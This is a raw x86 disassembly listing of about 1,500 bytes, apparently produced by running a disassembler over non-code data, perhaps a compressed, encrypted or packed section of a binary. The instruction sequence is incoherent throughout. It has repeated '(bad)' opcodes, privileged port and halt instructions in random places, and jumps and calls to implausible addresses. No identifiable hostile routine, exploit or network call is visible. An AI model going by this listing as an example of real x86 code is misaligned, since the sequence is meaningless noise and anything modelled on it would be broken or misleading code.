  424b19:	sbb    DWORD PTR [edi-0x67],ebp
  424b1c:	adc    DWORD PTR [esi+eax*8],edx
  424b1f:	imul   edi,ecx,0x4e90ebb5
  424b25:	mov    edx,?
  424b27:	ret    
  424b28:	dec    edx
  424b29:	sub    al,0x17
  424b2b:	out    dx,al
  424b2c:	ds aas 
  424b2e:	addr16 inc ecx
  424b30:	lods   al,BYTE PTR ds:[esi]
  424b31:	dec    edx
  424b32:	lods   eax,DWORD PTR ds:[esi]
  424b33:	sbb    ch,al
  424b35:	push   DWORD PTR [ebx+0x5c]
  424b38:	hlt    
  424b39:	int3   
  424b3a:	dec    ebp
  424b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b3c:	cmp    eax,0x896be55a
  424b41:	gs lock push ecx
  424b44:	ret    
  424b45:	mov    eax,ds:0x1d871c75
  424b4a:	adc    ebp,ebp
  424b4c:	dec    edx
  424b4d:	cmp    eax,ecx
  424b4f:	lahf   
  424b50:	fsubr  DWORD PTR [eax-0x562d680]
  424b56:	ins    BYTE PTR es:[edi],dx
  424b57:	test   BYTE PTR [edx+0x40],al
  424b5a:	sti    
  424b5b:	mov    fs,edi
  424b5d:	rcl    BYTE PTR [ecx-0x25],0xc
  424b61:	jae    0x424b82
  424b63:	hlt    
  424b64:	(bad)  
  424b65:	outs   dx,DWORD PTR ds:[esi]
  424b66:	std    
  424b67:	xchg   edx,eax
  424b68:	lock and DWORD PTR [esi-0x6d45f687],ebp
  424b6f:	ins    BYTE PTR es:[edi],dx
  424b70:	mov    ebp,ebx
  424b72:	push   ds
  424b73:	fwait
  424b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b75:	cdq    
  424b76:	jmp    0x424b09
  424b78:	pushf  
  424b79:	fistp  DWORD PTR [esi-0x6ed2d366]
  424b7f:	sbb    DWORD PTR [ebx+0x74c4b0a7],ebx
  424b85:	pop    edi
  424b86:	fcmove st,st(0)
  424b88:	add    dl,BYTE PTR [eax+0x24f1c8d0]
  424b8e:	adc    DWORD PTR [edx+eax*2+0x3886ffd7],esi
  424b95:	sub    eax,0x8f341bcc
  424b9a:	cs push ecx
  424b9c:	scas   al,BYTE PTR es:[edi]
  424b9d:	sbb    eax,0xb16b628b
  424ba2:	div    esp
  424ba4:	mov    ah,0x68
  424ba6:	fs sbb al,0xba
  424ba9:	jo     0x424bcd
  424bab:	xlat   BYTE PTR ds:[ebx]
  424bac:	sbb    ch,BYTE PTR [edx]
  424bae:	les    ebp,FWORD PTR [eax+0x606572e3]
  424bb4:	mov    esi,0xf5d0a9b1
  424bb9:	xor    ah,dh
  424bbb:	pop    DWORD PTR [edi-0x74d813ac]
  424bc1:	mov    esi,0x344616b9
  424bc6:	sub    al,0x8b
  424bc8:	aas    
  424bc9:	inc    esi
  424bca:	les    esi,FWORD PTR [edi-0xe]
  424bcd:	ins    DWORD PTR es:[edi],dx
  424bce:	enter  0xf9e2,0x31
  424bd2:	xor    dl,BYTE PTR [ecx]
  424bd4:	mov    DWORD PTR [ebx+eax*8-0x6029b9ef],0x31e39167
  424bdf:	popf   
  424be0:	(bad)  
  424be1:	(bad)  
  424be2:	pop    edx
  424be3:	int3   
  424be4:	sbb    al,dl
  424be6:	inc    ecx
  424be7:	or     bh,BYTE PTR [ebx]
  424be9:	add    bh,BYTE PTR [ecx-0x1559ff22]
  424bef:	push   edx
  424bf0:	mov    ds:0xb4159362,eax
  424bf5:	push   cs
  424bf6:	adc    BYTE PTR [ebp-0x3bae9306],0xfa
  424bfd:	lods   al,BYTE PTR ds:[esi]
  424bfe:	rcr    ah,1
  424c00:	sbb    dl,BYTE PTR [esi+0x7e]
  424c03:	test   eax,0xda64432
  424c08:	hlt    
  424c09:	push   ecx
  424c0a:	inc    edi
  424c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c0c:	xor    dh,BYTE PTR [ecx+0x64]
  424c0f:	lods   eax,DWORD PTR ds:[esi]
  424c10:	cmc    
  424c11:	test   ah,bl
  424c13:	stos   BYTE PTR es:[edi],al
  424c14:	aam    0x8a
  424c16:	pop    ecx
  424c17:	ret    0x52a7
  424c1a:	adc    eax,0x19e87f35
  424c1f:	push   edx
  424c20:	div    BYTE PTR [edx]
  424c22:	pop    es
  424c23:	mov    ecx,0x6faa72cb
  424c28:	mov    DWORD PTR gs:[edx],esp
  424c2b:	jle    0x424bce
  424c2d:	stos   DWORD PTR es:[edi],eax
  424c2e:	cmp    ebx,DWORD PTR [ebx-0x62]
  424c31:	fstp   QWORD PTR [esp+eax*2+0x61]
  424c35:	ret    
  424c36:	shl    BYTE PTR [edx+0x2f89707b],1
  424c3c:	push   0x943817d7
  424c41:	test   BYTE PTR [ecx],bl
  424c43:	test   DWORD PTR [ebx+ebp*1-0x7cd25380],ecx
  424c4a:	mov    ah,0xac
  424c4c:	lods   eax,DWORD PTR ds:[esi]
  424c4d:	cmp    al,0xd
  424c4f:	jo     0x424ccd
  424c51:	dec    ecx
  424c52:	dec    ebp
  424c53:	mov    DWORD PTR [edi+0x3ca709eb],ebp
  424c59:	jnp    0x424cc9
  424c5b:	dec    edx
  424c5c:	dec    eax
  424c5d:	aam    0xf7
  424c5f:	pop    edi
  424c60:	sti    
  424c61:	sub    eax,0xc65e1e21
  424c66:	pop    ebp
  424c67:	cld    
  424c68:	sub    eax,0xf51eff10
  424c6d:	jl     0x424cc1
  424c6f:	or     BYTE PTR [eax-0x577f6ba4],0x8f
  424c76:	add    eax,0x44671cbb
  424c7b:	inc    ebp
  424c7c:	ror    ecx,cl
  424c7e:	daa    
  424c7f:	mov    eax,0xd51f8777
  424c84:	cdq    
  424c85:	xchg   DWORD PTR [ebx+0x2031b079],edx
  424c8b:	les    ebx,FWORD PTR [edi]
  424c8d:	mov    eax,ds:0x626da900
  424c92:	(bad)  
  424c93:	pop    ecx
  424c94:	adc    dl,BYTE PTR [ebx-0x22]
	...
  424d13:	add    BYTE PTR [edi-0x1ab332f],ch
  424d19:	pop    ebp
  424d1a:	mov    edi,0x5e13fbfb
  424d1f:	cmp    DWORD PTR [ebx],ebp
  424d21:	mov    BYTE PTR [esi-0x16],al
  424d24:	jp     0x424d06
  424d26:	add    DWORD PTR [eax],eax
  424d28:	imul   eax,DWORD PTR [edi],0x0
  424d2b:	add    BYTE PTR [ebx*2+0x2e6d1185],dl
  424d32:	mov    edx,gs
  424d34:	adc    al,0x1e
  424d36:	adc    DWORD PTR [edx+edx*4-0x8ff4171],ecx
  424d3d:	fimul  WORD PTR [ebx-0x51]
  424d40:	inc    ebx
  424d41:	(bad)  
  424d42:	push   0xffffffe6
  424d44:	pop    ebp
  424d45:	daa    
  424d46:	dec    eax
  424d47:	xor    DWORD PTR [ecx+0x48],esp
  424d4a:	inc    esp
  424d4b:	test   BYTE PTR [eax-0x7e],dh
  424d4e:	adc    DWORD PTR [eax-0x9],ebp
  424d51:	imul   ebp,DWORD PTR [ebp-0x149e67f],0x2b
  424d58:	and    DWORD PTR [esi+eiz*1-0x36],ebx
  424d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d5d:	outs   dx,BYTE PTR fs:[esi]
  424d5f:	mov    bl,0x2c
  424d61:	stos   DWORD PTR es:[edi],eax
  424d62:	es push ds
  424d64:	or     edx,DWORD PTR [ecx+ecx*2]
  424d67:	mov    bl,0x58
  424d69:	mov    ecx,0xa735512f
  424d6e:	xchg   BYTE PTR [eax-0xb0685a1],bh
  424d74:	xor    edi,ebp
  424d76:	pop    ds
  424d77:	fucomi st,st(4)
  424d79:	jge    0x424d3c
  424d7b:	das    
  424d7c:	sysenter 
  424d7e:	xchg   ebx,eax
  424d7f:	cwde   
  424d80:	and    al,0x67
  424d82:	je     0x424d0f
  424d84:	sbb    eax,0x64e27e08
  424d89:	mov    BYTE PTR [edi],ah
  424d8b:	inc    ebp
  424d8c:	mov    bl,0xed
  424d8e:	sbb    esi,edi
  424d90:	call   0x2d61ec28
  424d95:	xchg   DWORD PTR [edx+0x35],edi
  424d98:	jb     0x424d5e
  424d9a:	sbb    edi,DWORD PTR cs:[ebx-0x5e]
  424d9e:	xchg   edi,eax
  424d9f:	(bad)  [edi+edx*2-0x1034bb63]
  424da6:	mov    ecx,0xe9683b2f
  424dab:	mov    bl,0x58
  424dad:	in     al,0xbc
  424daf:	xor    DWORD PTR [eax+0x77a829b],0x40
  424db6:	mov    dl,0xc6
  424db8:	fld    TBYTE PTR [eax]
  424dba:	mov    ebp,0x702120c4
  424dbf:	sub    al,0xfb
  424dc1:	pop    ds
  424dc2:	cmp    al,0x9c
  424dc4:	push   edi
  424dc5:	dec    ebx
  424dc6:	outs   dx,BYTE PTR ds:[esi]
  424dc7:	imul   eax,DWORD PTR [eax+0x5c],0x86c3b72f
  424dce:	push   ecx
  424dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dd0:	cli    
  424dd1:	cld    
  424dd2:	ret    
  424dd3:	fwait
  424dd4:	out    0xdc,eax
  424dd6:	dec    eax
  424dd7:	fwait
  424dd8:	int    0xd3
  424dda:	cmp    al,dh
  424ddc:	js     0x424dc1
  424dde:	call   0xe392735f
  424de3:	ficomp WORD PTR [edi-0x68169b11]
  424de9:	lfs    edx,FWORD PTR [ebx]
  424dec:	dec    esp
  424ded:	lds    ebx,FWORD PTR [ecx+0x27]
  424df0:	mov    ebp,0x3ad3c222
  424df5:	adc    DWORD PTR [bx+0x60e4],ebx
  424dfa:	pushf  
  424dfb:	setge  BYTE PTR [edx-0xd2e77b7]
  424e02:	shl    BYTE PTR [esi-0x679ac596],cl
  424e08:	scas   eax,DWORD PTR es:[edi]
  424e09:	jle    0x424dce
  424e0b:	adc    edi,DWORD PTR [eax-0x5ed43ca8]
  424e11:	xchg   esi,eax
  424e12:	inc    esp
  424e13:	mov    eax,0xaf3a0b4f
  424e18:	xor    al,0x6b
  424e1a:	sub    ch,BYTE PTR [edx-0x43f5073f]
  424e20:	ret    
  424e21:	aad    0x4
  424e23:	and    eax,0xeb2743e2
  424e28:	ins    BYTE PTR es:[edi],dx
  424e29:	xchg   esi,eax
  424e2a:	or     al,0x13
  424e2c:	shr    bl,1
  424e2e:	mov    ds:0x8f9954c8,eax
  424e33:	push   ds
  424e34:	add    DWORD PTR [ecx+esi*1+0x3ec7b2dc],esp
  424e3b:	cmp    DWORD PTR [eax],edi
  424e3d:	ss pop esp
  424e3f:	inc    esi
  424e40:	js     0xc5389378
  424e46:	mov    edx,0xd1595a5c
  424e4b:	push   es
  424e4c:	test   eax,0x68ea5567
  424e51:	fwait
  424e52:	mov    edx,0x1e22a8b7
  424e57:	push   ss
  424e58:	inc    ecx
  424e59:	adc    dh,ah
  424e5b:	ss push esp
  424e5d:	pop    ebp
  424e5e:	add    ah,BYTE PTR [eax-0x55]
  424e61:	dec    eax
  424e62:	or     dl,ah
  424e64:	cld    
  424e65:	(bad)  
  424e67:	jb     0x424df8
  424e69:	mov    bh,0xf5
  424e6b:	jno    0x424e2f
  424e6d:	cld    
  424e6e:	test   eax,0xe70451d7
  424e73:	and    DWORD PTR [ebp-0x46bd39df],ecx
  424e79:	or     DWORD PTR [edx-0x45],eax
  424e7c:	in     eax,dx
  424e7d:	dec    edi
  424e7e:	enter  0x47ec,0x29
  424e82:	lods   al,BYTE PTR ds:[esi]
  424e83:	dec    ecx
  424e84:	push   cs
  424e85:	das    
  424e86:	adc    al,0x5a
  424e88:	sbb    esp,DWORD PTR [ecx-0x20]
  424e8b:	sbb    cl,cl
  424e8d:	xor    cl,BYTE PTR [ecx]
  424e8f:	mov    ah,0x8
  424e91:	sti    
  424e92:	(bad)  
  424e93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e94:	imul   ebx,DWORD PTR [eax],0xe1a578a9
  424e9a:	add    eax,0xd38bd908
  424e9f:	inc    ecx
  424ea0:	push   0xffffffd8
  424ea2:	add    al,0x3a
  424ea4:	daa    
  424ea5:	pop    ds
  424ea6:	add    BYTE PTR [edx+0x44],al
  424ea9:	js     0x424e3d
  424eab:	add    eax,0x7c4b148a
  424eb0:	adc    BYTE PTR [ebx],ah
  424eb2:	test   BYTE PTR [esi],0x6
  424eb5:	lods   al,BYTE PTR ds:[esi]
  424eb6:	cs cmc 
  424eb8:	pop    edi
  424eb9:	sar    DWORD PTR [eax-0x71],1
  424ebc:	and    BYTE PTR [ecx+0x3b4f24fa],bh
  424ec2:	enter  0x66c3,0xc3
  424ec6:	jbe    0x424f3b
  424ec8:	jmp    0x44c7:0xad12a72
  424ecf:	and    DWORD PTR [esi+0x15ed1f32],0xffffff80
  424ed6:	into   
  424ed7:	mov    eax,0x859bba8b
  424edc:	pop    ebp
  424edd:	dec    esi
  424ede:	aas    
  424edf:	sub    bh,BYTE PTR [ecx]
  424ee1:	pop    ebx
  424ee2:	inc    edx
  424ee3:	xchg   esp,eax
  424ee4:	push   ss
  424ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ee6:	cmp    ecx,DWORD PTR [esi+0x1b0a7473]
  424eec:	or     eax,0x65663e9d
  424ef1:	sbb    dl,ch
  424ef3:	cmp    edx,edi
  424ef5:	rcl    DWORD PTR [eax-0x4f531a68],cl
  424efb:	sbb    cl,BYTE PTR [ecx]
  424efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424efe:	mov    eax,0x392c6c24
  424f03:	jo     0x424ef4
  424f05:	pop    eax
  424f06:	ror    ebp,cl
  424f08:	xor    al,0xf2
  424f0a:	scas   eax,DWORD PTR es:[edi]
  424f0b:	pop    esp
  424f0c:	addr16 inc eax
  424f0e:	out    0x1b,eax
  424f10:	loop   0x424eef
  424f12:	mov    esi,0x95540da1
  424f17:	(bad)  
  424f18:	mov    eax,ds:0xc8d263bc
  424f1d:	not    BYTE PTR [ebp-0x26]
  424f20:	sbb    DWORD PTR [eax-0x1],eax
  424f23:	cmp    al,0x65
  424f25:	adc    BYTE PTR [edx],dl
  424f27:	jg     0x424fa8
  424f29:	mov    ch,0x4a
  424f2b:	inc    eax
  424f2c:	jecxz  0x424ee0
  424f2e:	in     eax,0x91
  424f30:	mov    esi,0x29582d98
  424f35:	sub    ebp,esi
  424f37:	mov    ds:0x398d378a,eax
  424f3c:	push   0x19
  424f3e:	push   0xb31cecf9
  424f43:	jecxz  0x424efe
  424f45:	push   edi
  424f46:	ds jle 0x424f30
  424f49:	xchg   edi,eax
  424f4a:	jnp    0x424f16
  424f4c:	pop    edi
  424f4d:	outs   dx,DWORD PTR ds:[esi]
  424f4e:	sub    eax,0x3e6f906
  424f53:	gs clc 
  424f55:	xor    al,0xed
  424f57:	sub    DWORD PTR [ecx],ebx
  424f59:	push   cs
  424f5a:	inc    ecx
  424f5b:	pop    ebx
  424f5c:	arpl   WORD PTR [edx],dx
  424f5e:	lahf   
  424f5f:	push   0xab48e022
  424f64:	sub    DWORD PTR [edi+ebx*1+0x56ff3a30],esi
  424f6b:	cli    
  424f6c:	dec    esp
  424f6d:	test   eax,0xf45f2fc1
  424f72:	push   esi
  424f73:	push   ebp
  424f74:	jge    0x424fa5
  424f76:	jno    0x424fed
  424f78:	or     eax,0x7087fe9e
  424f7d:	xor    eax,0x1d918aba
  424f82:	ror    DWORD PTR [esi-0x7a18664c],1
  424f88:	jg     0x424fe3
  424f8a:	dec    ebx
  424f8b:	ret    
  424f8c:	dec    ebx
  424f8d:	repz dec ebp
  424f8f:	lods   al,BYTE PTR ds:[esi]
  424f90:	es out 0x5d,eax
  424f93:	push   ebx
  424f94:	dec    BYTE PTR ds:0x80b6a47d
  424f9a:	xchg   esi,eax
  424f9b:	jmp    0xe308:0xec67b9fd
  424fa2:	mov    BYTE PTR [eax+0x3],ah
  424fa5:	ret    
  424fa6:	call   0x417d2e7
  424fab:	lds    edi,FWORD PTR [esi]
  424fad:	and    ah,BYTE PTR [esi-0x12]
  424fb0:	(bad)  
  424fb2:	fnstsw WORD PTR [eax+ebp*1-0x4837d6d4]
  424fb9:	push   edx
  424fba:	push   0x51
  424fbc:	mov    al,ds:0x87275380
  424fc1:	clc    
  424fc2:	or     DWORD PTR [ebx-0x56c069a7],0x72d7c018
  424fcc:	or     BYTE PTR fs:[esi-0x7aa18c5],dl
  424fd3:	or     DWORD PTR [ecx+0x70d3ad3c],0xc2d53a2e
  424fdd:	shl    BYTE PTR [edi],1
  424fdf:	mov    ch,0xc7
  424fe1:	push   ebp
  424fe2:	dec    esi
  424fe3:	dec    ebx
  424fe4:	and    eax,0x8cb42150
  424fe9:	lock aad 0x77
  424fec:	bound  esi,QWORD PTR [ebp+0x315e045a]
  424ff2:	pushf  
  424ff3:	imul   BYTE PTR [ebp-0x28705fc3]
  424ff9:	push   0xfac89c00
  424ffe:	dec    edi
  424fff:	lods   eax,DWORD PTR ds:[esi]
  425000:	dec    edx
  425001:	ror    DWORD PTR [edx-0x5],cl
  425004:	cmp    esi,esp
  425006:	sahf   
  425007:	(bad)  
  425008:	(bad)  
  425009:	mov    dh,0x5b
  42500b:	mov    dl,0xc8
  42500d:	or     edi,ebx
  42500f:	add    ebp,esp
  425011:	imul   esi,DWORD PTR [edi],0x3b
  425014:	test   edx,0x574432e1
  42501a:	hlt    
  42501b:	adc    al,ah
  42501d:	and    BYTE PTR [ecx+0x32],0xf
  425021:	or     eax,0x890d4618
  425026:	fist   WORD PTR [esi-0x44]
  425029:	jno    0x425069
  42502b:	and    ebp,0xc
  42502e:	test   eax,0xf322997d
  425033:	loop   0x4250af
  425035:	aaa    
  425036:	jb     0x424ffc
  425038:	jp     0x424fe1
  42503a:	push   ds
  42503b:	lds    esi,FWORD PTR [esi]
  42503d:	mov    gs,WORD PTR [eax]
  42503f:	mov    ch,0xb1
  425041:	inc    esp
  425042:	mov    dh,0x60
  425044:	popf   
  425045:	retf   
  425046:	(bad)  
  425047:	xchg   ebx,eax
  425048:	call   0x1a07f93d
  42504d:	repnz sets BYTE PTR [ecx+0x56]
  425052:	jb     0x425012
  425054:	imul   ecx,DWORD PTR [ebx-0x34497d59],0x123dcdd4
  42505e:	in     al,dx
  42505f:	or     BYTE PTR [ecx+eiz*2],0xe7
  425063:	int    0xff
  425065:	sbb    edi,DWORD PTR [ebx-0x5474ce98]
  42506b:	or     al,0x6a
  42506d:	mov    cl,0xa1
  42506f:	cmp    eax,0x27d7db82
  425074:	mov    eax,ds:0xfa40999b
  425079:	fs pop edx
  42507b:	in     eax,0x6
  42507d:	in     al,0xb9
  42507f:	push   eax
  425080:	in     eax,0x57
  425082:	xor    ecx,DWORD PTR [edx+ebx*1-0x6d87c6d9]
  425089:	mov    BYTE PTR [ebx+0x3c26369c],ch
  42508f:	das    
  425090:	ins    BYTE PTR es:[edi],dx
  425091:	mov    ds:0x6e4a1e23,eax
  425096:	imul   edx,DWORD PTR [esp+eax*4],0xffffffde
  42509a:	ds (bad) 
  42509c:	(bad)  
  42509d:	mov    edi,DWORD PTR [eax-0x39]
  4250a0:	adc    BYTE PTR [ebx+0x70],0x63
  4250a4:	push   es
  4250a5:	pusha  
  4250a6:	push   edi
  4250a7:	jb     0x4250ec
  4250a9:	das    
  4250aa:	dec    ebx
  4250ab:	xchg   edx,eax
  4250ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250ad:	mov    ebp,0x2ad4e4df
  4250b2:	mov    al,0x5
  4250b4:	jp     0x4250c1
  4250b6:	or     edi,esi
  4250b8:	add    BYTE PTR [edx],ch
  4250ba:	aaa    
  4250bb:	int    0xc2
  4250bd:	and    edi,DWORD PTR [ebp+0x50cb7435]
  4250c3:	xchg   ebx,eax
  4250c4:	mov    eax,esi
  4250c6:	mov    ebp,edx
  4250c8:	shl    BYTE PTR [ecx-0x1a],1
  4250cb:	or     cl,dh
  4250cd:	test   eax,0xf0882f6
  4250d2:	mov    ecx,0x4c86122
  4250d7:	into   
  4250d8:	repz push 0xffffffbc
  4250db:	adc    eax,0x4b52470f
  4250e0:	loopne 0x425112
  4250e2:	mov    al,0xde
  4250e4:	pop    eax
  4250e5:	jb     0x4250af
  4250e7:	mov    ch,0x2e
  4250e9:	push   es
  4250ea:	not    BYTE PTR [edi+0x2bad7bdd]
  4250f0:	rcr    BYTE PTR [eax+edi*2],cl
  4250f3:	rcr    DWORD PTR ds:0xae762109,cl
  4250f9:	mov    ecx,0x6e4e4770
  4250fe:	lds    ebp,FWORD PTR [ecx]
  425100:	and    esi,DWORD PTR [esp+esi*1]
  425103:	inc    esp
  425104:	nop
  425105:	lahf   
  425106:	inc    ecx
  425107:	or     al,0xb7
  425109:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42510b:	or     BYTE PTR [bp+di+0x7],bl
  42510f:	sub    esp,DWORD PTR [ecx-0x79]
  425112:	xor    DWORD PTR [eax-0x74],ecx
  425115:	out    dx,al
  425116:	rcl    BYTE PTR [edx+esi*2-0x2c8636b],cl
  42511d:	les    edx,FWORD PTR [ecx]
  42511f:	out    0x5d,al
  425121:	pop    ebp
  425122:	sub    edi,DWORD PTR [ebp+0x10]
  425125:	out    0xa1,eax
  425127:	ins    DWORD PTR es:[edi],dx
  425128:	mov    ecx,0xe74a3d30
  42512d:	in     al,dx
  42512e:	stos   DWORD PTR es:[edi],eax
  42512f:	stc    
  425130:	loop   0x42512b
  425132:	push   ds
  425133:	jmp    0x4250c6
  425135:	jmp    0x425191
  425137:	sub    ecx,DWORD PTR [eax-0x3]
  42513a:	xor    ch,BYTE PTR [edi]
  42513c:	inc    esi
  42513d:	mov    al,0xdd
  42513f:	or     ecx,DWORD PTR [ebp+0x123172c7]
  425145:	jmp    0x5087f94
  42514a:	xor    ebx,eax
  42514c:	mov    DWORD PTR [eax+ebx*4+0x17],0x2b9a5dcf
  425154:	xchg   ebx,eax
  425155:	cli    
  425156:	sbb    ch,dl
  425158:	mov    esi,0x41919781
  42515d:	jmp    0x518f798a
  425162:	repz loop 0x4251a2
  425165:	jae    0x4251d0
  425167:	(bad)  
  425168:	ficom  DWORD PTR [ebp+0x4c]
  42516b:	stos   BYTE PTR es:[edi],al
  42516c:	imul   esp,DWORD PTR [ebp-0x2c57662d],0x28
  425173:	ins    DWORD PTR es:[edi],dx
  425174:	jl     0x425150
  425176:	rcr    DWORD PTR [ebx],cl
  425178:	mov    WORD PTR [ecx+eax*1+0x441823b2],fs
  42517f:	loope  0x4251e3
  425181:	leave  
  425182:	mov    bl,0xcf
  425184:	push   ebp
  425185:	sbb    cl,BYTE PTR [ebx-0x34736393]
  42518b:	(bad)  
  42518c:	repz loope 0x425185
  42518f:	sub    eax,0xf6bc64a0
  425194:	sbb    ecx,DWORD PTR [eax+0x6f1054a5]
  42519a:	and    edx,ebx
  42519c:	fstp   st(4)
  42519e:	push   es
  42519f:	add    dl,BYTE PTR [edi]
  4251a1:	inc    ebx
  4251a2:	xchg   BYTE PTR [edx-0x14],dl
  4251a5:	cmp    BYTE PTR [eax-0x111be47a],dl
  4251ab:	daa    
  4251ac:	aas    
  4251ad:	repz add al,0x5
  4251b0:	or     al,0x2f
  4251b2:	sbb    DWORD PTR ds:0xde794186,esp
  4251b8:	pusha  
  4251b9:	and    dh,ch
  4251bb:	inc    ecx
  4251bc:	jo     0x4251f4
  4251be:	inc    eax
  4251bf:	jmp    0x37ff:0x5e2a3a56
  4251c6:	test   DWORD PTR [edi-0x4a],esp
  4251c9:	push   esi
  4251ca:	add    al,0x18
  4251cc:	ins    DWORD PTR es:[edi],dx
  4251cd:	inc    eax
  4251ce:	jnp    0x4251e2
  4251d0:	or     al,0x1f
  4251d2:	lahf   
  4251d3:	js     0x4251dc
  4251d5:	sar    BYTE PTR ss:0xf07c48e4,cl
  4251dc:	or     DWORD PTR [ebx+0x3d],ebp
  4251df:	sub    al,0x19
  4251e1:	lock icebp 
  4251e3:	les    edi,FWORD PTR [esi]
  4251e5:	mov    dl,0x4e
  4251e7:	loop   0x4251a9
  4251e9:	sub    edx,DWORD PTR [edi+0x3f32cdd5]
  4251ef:	arpl   WORD PTR ds:0x11ff427f,si
  4251f5:	mov    eax,0x500e2be2
  4251fa:	rcr    DWORD PTR [edx-0x62],cl
  4251fd:	in     al,dx
  4251fe:	dec    ebp
  4251ff:	sub    eax,0x34240c56
  425204:	inc    esp
  425205:	js     0x4251ef
  425207:	lods   eax,DWORD PTR ds:[esi]
  425208:	push   esi
  425209:	fmul   st(0),st
  42520b:	xchg   esp,eax
  42520c:	int3   
  42520d:	cli    
  42520e:	sbb    BYTE PTR [ebp+ecx*4+0x27e73666],ah
  425215:	clc    
  425216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425217:	pop    esp
  425218:	mov    bh,0x77
  42521a:	mov    ds:0x348ac246,al
  42521f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425220:	dec    ebp
  425221:	fisubr DWORD PTR [edi+0x6da52a9a]
  425227:	ret    
  425228:	push   ebp
  425229:	or     eax,0xee2da8b
  42522e:	sub    al,0x7e
  425230:	nop
  425231:	in     al,dx
  425232:	sbb    al,0x25
  425234:	push   0x74
  425236:	sbb    esp,DWORD PTR [edi+esi*4]
  425239:	mov    cl,dl
  42523b:	xchg   ecx,eax
  42523c:	push   esi
  42523d:	pop    eax
  42523e:	test   al,0xf4
  425240:	mov    ebp,0x171f1471
  425245:	mov    ecx,0x9fbc4b33
  42524a:	sub    esp,DWORD PTR [edi+0xb9d1389]
  425250:	in     eax,0x2c
  425252:	scas   al,BYTE PTR es:[edi]
  425253:	retf   
  425254:	or     ch,al
  425256:	test   BYTE PTR [edi+0x6f],dh
  425259:	pop    ecx
  42525a:	inc    ebx
  42525b:	jge    0x425220
  42525d:	out    dx,eax
  42525e:	loope  0x4251fa
  425260:	xchg   ecx,eax
  425261:	or     al,0x54
  425263:	std    
  425264:	ror    DWORD PTR [ebx+0x6e],cl
  425267:	push   edi
  425268:	dec    edx
  425269:	push   esp
  42526a:	add    al,0x23
  42526c:	mov    edx,0xab69ea46
  425271:	int    0x42
  425273:	ror    BYTE PTR [ecx+eax*2+0x17],0x9d
  425278:	mov    al,0x81
  42527a:	stos   DWORD PTR es:[edi],eax
  42527b:	sti    
  42527c:	int    0xe0
  42527e:	out    dx,al
  42527f:	clc    
  425280:	xor    ebx,eax
  425282:	mov    bl,0xed
  425284:	enter  0xe1dc,0xae
  425288:	ds jp  0x42526a
  42528b:	retf   0xfdec
  42528e:	cdq    
  42528f:	xchg   ebx,eax
  425290:	dec    ebx
  425291:	je     0x425220
  425293:	ret    0x3917
  425296:	adc    eax,0x4d2e2ced
  42529b:	push   0x5041c720
  4252a0:	rcl    DWORD PTR [eax],1
  4252a2:	repnz das 
  4252a4:	mov    bh,0x14
  4252a6:	mov    ebp,0x45bdb6b7
  4252ab:	pop    ebp
  4252ac:	jno    0x42523e
  4252ae:	jmp    0x4faf:0xb93f8f86
  4252b5:	mov    edi,0x48688d74
  4252ba:	addr16 shr eax,cl
  4252bd:	loope  0x4252c4
  4252bf:	iret   
  4252c0:	scas   al,BYTE PTR es:[edi]
  4252c1:	fimul  DWORD PTR [ecx+0x1b]
  4252c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252c5:	bound  esi,QWORD PTR [ecx+0x6c]
  4252c8:	mov    bl,0xf8
  4252ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252cb:	cmp    esi,DWORD PTR [edi+0x63d13642]
  4252d1:	ds mov edx,0x249a9dbf
  4252d7:	enter  0x48a1,0x7d
  4252db:	ins    BYTE PTR es:[edi],dx
  4252dc:	test   eax,0xc9746c9d
  4252e1:	sbb    DWORD PTR [eax+0x19],0xffffffcf
  4252e5:	ja     0x42532c
  4252e7:	outs   dx,BYTE PTR ds:[esi]
  4252e8:	xchg   ah,bh
  4252ea:	add    DWORD PTR [ecx-0x55],ebp
  4252ed:	cmp    al,0xeb
  4252ef:	ja     0x4252b7
  4252f1:	mov    esp,0x70e1f0aa
  4252f6:	sbb    eax,0xd2ef8b59
  4252fb:	sar    DWORD PTR [edx-0x48],1
  4252fe:	adc    esp,DWORD PTR [ebp+eax*2+0x59]
  425302:	std    
  425303:	jmp    0xbbd3:0xa6daa217
  42530a:	mov    DWORD PTR [esi-0x1e],ebp
  42530d:	sbb    edx,DWORD PTR [eax+ecx*8]
  425310:	rcl    BYTE PTR [edx],1
  425312:	or     bh,BYTE PTR [eax-0x75f1426e]
  425318:	jmp    0x42534a
  42531a:	ss ins BYTE PTR es:[edi],dx
  42531c:	add    al,0xe7
  42531e:	sbb    eax,0x2edf25f2
  425323:	lods   al,BYTE PTR ds:[esi]
  425324:	rcr    DWORD PTR [esi+0x5513d3e9],1
  42532a:	push   ebx
  42532b:	and    eax,DWORD PTR [edx+0x18130dec]
  425331:	sub    bh,BYTE PTR [edi+0x25]
  425334:	mov    al,0x2
  425336:	les    eax,FWORD PTR [eax+0x54eb2767]
  42533c:	mov    ebx,0xa67fa563
  425341:	sub    BYTE PTR [esp+ebx*1-0x3f],0xd8
  425346:	pop    edx
  425347:	mov    ebx,0x543e1684
  42534c:	jae    0x425320
  42534e:	adc    ebx,DWORD PTR [edx+0x9a13deb]
  425354:	lahf   
  425355:	push   0xffffff9d
  425357:	ja     0x425336
  425359:	daa    
  42535a:	add    al,0xb7
  42535c:	mov    dl,0x34
  42535e:	call   0xfb282bd7
  425363:	and    BYTE PTR [ebx+0x23],0xf3
  425367:	stos   DWORD PTR es:[edi],eax
  425368:	stos   BYTE PTR es:[edi],al
  425369:	rol    BYTE PTR [edx],1
  42536b:	dec    eax
  42536d:	lock lds edx,FWORD PTR [ebp-0x54a1ff66]
  425374:	adc    BYTE PTR [esi+eax*2-0x80],cl
  425378:	cs xor ch,bh
